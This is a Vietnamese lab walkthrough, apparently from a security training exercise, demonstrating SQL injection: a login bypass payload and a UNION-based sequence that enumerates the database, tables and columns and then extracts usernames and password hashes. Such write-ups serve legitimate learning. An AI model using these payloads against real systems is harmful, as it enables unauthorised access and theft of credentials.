# SQLI

![image](https://github.com/user-attachments/assets/315cc4ab-7e61-42fa-9021-213985d93067)

![Screenshot 2025-04-24 184219](https://github.com/user-attachments/assets/ff756284-09ae-4e69-9fe1-610498218883)


Đầu tiên chúng ta kiểm tra xem biểu mẫu có dễ bị tấn công SQLI không, Để làm điều đó chúng ta sẽ thử thêm một payload vào Username bằng cách chèn một dấu ngoặc đơn

![Screenshot 2025-04-24 184905](https://github.com/user-attachments/assets/c4272d22-70ec-4d78-8abc-6c8865ecb869)

Và tôi thấy lỗi SQL thay vì Login Failed, Vì vậy chúng ta bypass bằng cách chèn 1 payload như sau
> ' OR id = 5 ) #

Dấu # có vai trò giống như -- ( comments )

Và câu truy vấn trông sẽ như thế này

![Screenshot 2025-04-24 185213](https://github.com/user-attachments/assets/a7ff9645-6a75-49b5-a143-400d4ade9370)


# UNION-based SQL Injection.

![image](https://github.com/user-attachments/assets/7650d3b0-281b-4345-ac50-8277c9a319c1)

![Screenshot 2025-05-01 143924](https://github.com/user-attachments/assets/4456d820-9c3c-46ed-9af2-acdca97ce2c9)

Truy vần này dựa vào Where cho phép chúng ta lọc ra các kết quả theo ý muốn.

Bước đầu ta kiểm tra xem có bị lỗi SQLI không bằng gửi payload như sau
> 'UNION SELECT 1-- -
 tăng dần các cột lên 2 3 4...

![Screenshot 2025-05-01 145006](https://github.com/user-attachments/assets/2f4824e1-3d0b-49f0-b53a-3c32301a8922)
Vậy ta web này đang dính lỗi SQLI cục thể là UNION-based SQL ịnection

Lấy ra database hiện tại
> aaaa' UNION SELECT 1,database(),2,3-- -

![image](https://github.com/user-attachments/assets/275a74bf-49e1-4aa9-b9fa-0918d41fc04e)

Bây giờ chúng ta cần lấy ra các bản của db vừa tìm được để truy vấn bằng payload như sau

>cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='ilfreight'-- -

![image](https://github.com/user-attachments/assets/404aa435-89b9-4e80-b9a2-d667bdbdf828)

Bây giờ chúng ta lấy ra các cột của bảng bằng payload như sau 
>cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -

![image](https://github.com/user-attachments/assets/79576ff6-e38e-463c-b3e6-7be5eda98c34)

giờ thì chúng ta lấy dữ liệu từ 2 cột username và password bằng payload như sau
>cn' UNION select 1, username, password, 4 from ilfreight.users-- -

![image](https://github.com/user-attachments/assets/5a22c6b4-5c62-406d-a6bc-76b19f5e7830)

Vậy là chúng ta đã có được mật khẩu băm của newuser












